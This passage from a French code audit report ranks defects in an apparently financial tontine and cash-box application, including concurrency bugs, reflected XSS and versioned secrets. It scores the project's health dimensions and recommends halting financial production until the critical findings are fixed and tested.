| 4 | F-16 | Lost update sur soldes de caisse (pas de `@Version`) | Critique |
| 5 | F-06 | Sur-crédit caisse Sanction = création monétaire | Critique |
| 6 | F-05 | Paiement sanction non atomique | Critique |
| 7 | F-07 | Dettes tontine jamais soldées (sens inversé) | Critique |
| 8 | F-10 | Étapes financières de séance rejouables | Critique |
| 9 | F-11 | Suppression membre → cascade destructrice | Critique |
| 10 | F-12 | Secrets versionnés + rôle reports sur-privilégié | Critique |
| 11 | F-15 | Backups inopérants + échec silencieux | Critique |
| 12 | F-02 | Mapping enum `attendance_status` → crash démarrage | Critique |
| 13 | F-08 | Invariants de clôture uniquement côté UI | Élevée |
| 14 | F-13 | XSS réfléchie dans ReportController | Élevée |
| 15 | F-09 | GET qui clôture un tour (effet de bord) | Élevée |
| 16 | F-19/F-20 | Sur-remboursement prêt & sur-paiement frais perdus | Élevée |
| 17 | F-18 | Prêt sans plafond vs épargne | Élevée |
| 18 | F-23 | Clôture tour tontine avec dettes ouvertes | Élevée |
| 19 | F-17 | Recherche globale : filtre ignoré (OR mal parenthésé) | Élevée |
| 20 | F-14/F-25 | Autorisation rapports + rôle lisant `password_hash` | Élevée |

### Carte des zones à risque

- 🔴 **`session` + `RevolvingFundService`** *(le plus fragile)* : cœur financier, machine à états double (status/step) incohérente, 3 scénarios complexes buggés, effets de bord, rejouabilité.
- 🔴 **`tontine`** : modèle de dette pair-à-pair non fonctionnel (F-07/F-22/F-23), rotation non contrainte.
- 🔴 **`cashbox`** : écrivain central sans concurrence ni contrôle de solde ni réconciliation (impacte tous les modules).
- 🟠 **`infrastructure` / DB** : secrets, backups, enums fragiles, cascades destructrices, `validate` menacé.
- 🟠 **`report`** : process externe, XSS, deadlock, couplage Windows.
- 🟢 **`member` / `security`** : plus sains, mais delete destructif et absence de mouvement de caisse sur les frais.

### Dette technique

**Élevée.** Bonne intention architecturale (hexagonal propre, séparation des couches) mais :

- ~11 migrations dont plusieurs « fix enum » successifs révélant une instabilité de schéma non résolue ;
- double repository + mappers manuels très verbeux ;
- `BaseEntity` conçu mais inutilisé (duplication de ~20 blocs de timestamps) ;
- `catch(Exception)` généralisé masquant les causes ;
- **quasi-absence de tests** (1 fichier).

Le ratio « abstraction promise / invariant réellement garanti » est faible : beaucoup de structure, peu de filets de sécurité.

### Santé globale

| Dimension | Note /10 | Justification |
|---|---|---|
| Architecture | **6.5** | Hexagonal cohérent et lisible, mais couplage cross-module fort à la clôture de séance et duplication. |
| Logique métier | **3** | Bugs structurels : tontine (dettes), fonds (remise à zéro), rotation non contrainte, machine à états morte. |
| Robustesse | **2.5** | Aucune concurrence gérée, non-idempotence, transactions non atomiques, crash dashboard, backups KO. |
| Sécurité | **3** | Secrets versionnés, XSS, rôle sur-privilégié, autorisations partielles, invariants UI-only. |
| Maintenabilité | **4.5** | Structure claire mais dette enum/migrations, quasi pas de tests, code mort. |
| Lisibilité | **7** | Code bien nommé, commenté, formaté ; français cohérent. |
| Cohérence | **4** | Divergences UI/backend, doc/impl, modèle/service, conventions enum mixtes. |

> ## 🎯 Note globale : **3.8 / 10**
>
> Le projet est **soigné en surface** (architecture, lisibilité) mais **non prêt pour la production financière**. Les invariants monétaires ne sont garantis nulle part de façon fiable : au moins **11 défauts Bloquant/Critique** touchent directement l'intégrité de la trésorerie, la disponibilité ou la sécurité. La combinaison « aucun test + aucune contrainte base + aucune concurrence gérée » signifie que ces bugs ne seront pas rattrapés par un filet de sécurité.
>
> **Recommandation : gel de toute mise en production financière** jusqu'à correction des F-01 à F-17, puis introduction d'une suite de tests d'intégration (Testcontainers) couvrant les scénarios monétaires avant toute évolution.

---

*Fin du rapport. Audit réalisé en lecture seule — aucun fichier du projet n'a été modifié.*
